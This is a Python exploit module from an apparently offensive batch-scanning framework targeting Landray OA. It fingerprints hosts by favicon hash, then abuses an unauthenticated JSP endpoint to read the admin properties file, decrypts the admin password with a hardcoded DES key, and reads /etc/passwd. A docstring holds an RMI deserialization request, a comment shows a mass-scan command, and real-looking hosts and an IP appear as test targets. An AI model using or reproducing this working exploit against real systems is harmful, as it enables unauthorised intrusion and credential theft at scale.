# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 18:24
import base64
import hashlib
import re

import pyDes
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# app="Landray-OA系统"
# python batch.py -m exploit.web.OA.Landray.unauth_ssrf -cs -fs "app=\"Landray-OA系统\""
class Script(BaseScript):
    name = 'Landray'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.SSRF and BugType.DESERIALIZE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/sys/ui/extend/varkind/custom.jsp']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['302464c3f6207d57240649926cfc7bd4']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Landray Finger', url))
                                return {'name': 'Landray Finger', 'url': url, 'software': 'Landray'}
        except Exception:
            return None

    async def exec(self):
        def decodeDes(secret_key, s):
            cipherX = pyDes.des('        ')  # 默认就需要8位，所以这里就先用空格来进行填充，后面再用解密密钥来进行填充
            cipherX.setKey(secret_key)
            decodeText = cipherX.decrypt(s)
            return decodeText

        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                # 第一种 读取密码
                data1 = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
                async with self.session.post(url=url, data=data1, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None and response.status == 200:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'password' in text:
                            encodePassword = re.search(r'password = (.*)\\r', text).group(1)
                            clearText = decodeDes('kmssAdmin', base64.b64decode(encodePassword)).decode('utf-8')
                            tqdm.write(Fore.RED + '[{}] {} password: {}'.format('Landray xmlDecoder Deserialize', url, clearText))
                            '''
                            POST /admin.do HTTP/1.1
                            Host: 
                            Cookie: JSESSIONID=90EA764774514A566C480E9726BB3D3F; Hm_lvt_9838edd365000f753ebfdc508bf832d3=1620456866; Hm_lpvt_9838edd365000f753ebfdc508bf832d3=1620459967
                            Content-Length: 70
                            Cache-Control: max-age=0
                            Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"
                            Sec-Ch-Ua-Mobile: ?0
                            Upgrade-Insecure-Requests: 1
                            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
                            Origin: 
                            Content-Type: application/x-www-form-urlencoded
                            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

                            method=testDbConn&datasource=rmi://xxx.xxx.xxx.xxx:1099/cbdsdg
                            '''
                            return {'name': 'Landray xmlDecoder Deserialize password: {}'.format(encodePassword), 'url': url, 'software': 'Landray'}

                # 第二种正常读取文件
                data2 = 'var={"body":{"file":"file:///etc/passwd"}}'
                async with self.session.post(url=url, data=data2, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response1:
                    if response is not None and response1.status == 200:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'root:' in text:
                            tqdm.write(Fore.RED + '[{}] {}'.format('Landray ReadFile', url))
                            return {'name': 'Landray ReadFile', 'url': url, 'software': 'Landray'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://kms.biad.com.cn/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
